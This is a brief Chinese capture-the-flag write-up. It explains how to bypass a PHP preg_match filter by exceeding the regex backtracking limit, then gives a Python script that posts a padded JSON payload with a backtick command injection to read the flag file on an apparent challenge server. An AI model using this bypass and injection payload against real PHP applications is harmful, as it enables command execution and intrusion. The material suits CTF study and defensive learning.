![[Pasted image 20231214092655.png]]
preg_match过滤了换行符和异或符号，所以考虑利用preg_match本身回身回溯超过1000000会返回false绕过。

payload:

    import requests
    payload='{"cmd":"?><?= `tail /f*`?>","test":"' + "@"*(1000000) + '"}'
    res = requests.post("http://1.14.71.254:28397/", data={"letter":payload})
    print(res.text)
